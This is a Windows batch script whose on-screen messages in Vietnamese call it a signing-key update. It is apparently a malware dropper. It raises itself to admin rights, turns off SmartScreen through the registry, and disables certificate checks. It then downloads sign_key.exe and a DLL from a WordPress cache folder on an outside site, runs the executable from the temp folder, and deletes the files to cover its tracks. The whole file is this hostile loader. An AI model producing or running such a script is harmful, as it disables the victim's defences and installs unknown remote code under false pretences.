@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Dang xac minh hop le...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit
)

echo Dang kiem tra server tai file...
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled 2>nul | find "Off" >nul
if %errorlevel% neq 0 (
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f >nul 2>&1
    if %errorlevel% neq 0 (
        echo Loi khi tat SmartScreen trong Explorer
    )
)

reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen 2>nul | find "REG_DWORD    0x0" >nul
if %errorlevel% neq 0 (
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
    if %errorlevel% neq 0 (
        echo Loi khi tat SmartScreen trong Policies
    )
)

echo Dang tai file sign_key.exe...
powershell -Command "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Invoke-WebRequest -Uri 'http://filter.com.vn/wp-content/cache/sign_key.exe' -OutFile '%TEMP%\sign_key.exe'"

echo Dang tai file e_sqlite3.dll...
powershell -Command "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Invoke-WebRequest -Uri 'http://filter.com.vn/wp-content/cache/e_sqlite3.dll' -OutFile '%TEMP%\e_sqlite3.dll'"

echo Da tai xong. Dang tien hanh cap nhat sign...
cd /d "%TEMP%"
start "" "sign_key.exe"
timeout /t 5 /nobreak >nul

echo Dang xoa file...
del "%TEMP%\sign_key.exe" >nul 2>&1
del "%TEMP%\e_sqlite3.dll" >nul 2>&1

echo Hoan tat!
exit
